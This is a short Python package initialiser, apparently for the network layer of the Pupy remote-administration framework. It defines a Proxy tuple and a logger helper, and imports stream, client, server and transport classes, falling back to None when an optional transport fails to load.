# -*- encoding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function

__all__ = (
    'Proxy', 'getLogger',
    'PupySocketStream', 'PupyUDPSocketStream',
    'chain_transports',
    'PupyTCPServer', 'PupyUDPServer',
    'PupyTCPClient', 'PupySSLClient',
    'PupyProxifiedTCPClient', 'PupyProxifiedSSLClient',
    'PupyUDPClient',
    'DummyPupyTransport',

    'RSA_AESClient', 'RSA_AESServer',
    'PupyHTTPClient', 'PupyHTTPServer',
    'PupyWebSocketClient', 'PupyWebSocketServer',
    'EC4TransportServer', 'EC4TransportClient',
    'ECMTransportServer', 'ECMTransportClient'
)

import logging

from collections import namedtuple

Proxy = namedtuple(
    'Proxy', [
       'type', 'addr', 'username', 'password'
    ]
)

logger = logging.getLogger('pupy.network')


def getLogger(name):
    return logger.getChild(name)


from .streams.PupySocketStream import PupySocketStream


try:
    from .streams.PupySocketStream import PupyUDPSocketStream
except:
    PupyUDPSocketStream = None


from .base import chain_transports
from .servers import PupyTCPServer, PupyUDPServer
from .clients import PupyTCPClient, PupySSLClient
from .clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
from .clients import PupyUDPClient

from .transports.dummy import DummyPupyTransport


try:
    from .transports.rsa_aes import RSA_AESClient, RSA_AESServer
except Exception as e:
    logger.exception('Transport rsa_aes disabled: %s', e)
    RSA_AESClient = None
    RSA_AESServer = None

try:
    from .transports.http import PupyHTTPClient, PupyHTTPServer
except Exception as e:
    logger.exception('Transport http disabled: %s', e)
    PupyHTTPClient = None
    PupyHTTPServer = None

try:
    from .transports.websocket import PupyWebSocketClient, PupyWebSocketServer
except Exception as e:
    logger.exception('Transport websocket disabled: %s', e)
    PupyWebSocketClient = None
    PupyWebSocketServer = None

try:
    from .transports.ec4 import EC4TransportServer, EC4TransportClient
except Exception as e:
    logger.exception('Transport ec4 disabled: %s', e)
    EC4TransportServer = None
    EC4TransportClient = None

try:
    from .transports.ecm import ECMTransportServer, ECMTransportClient
except Exception as e:
    logger.exception('Transport ecm disabled: %s', e)
    ECMTransportServer = None
    ECMTransportClient = None

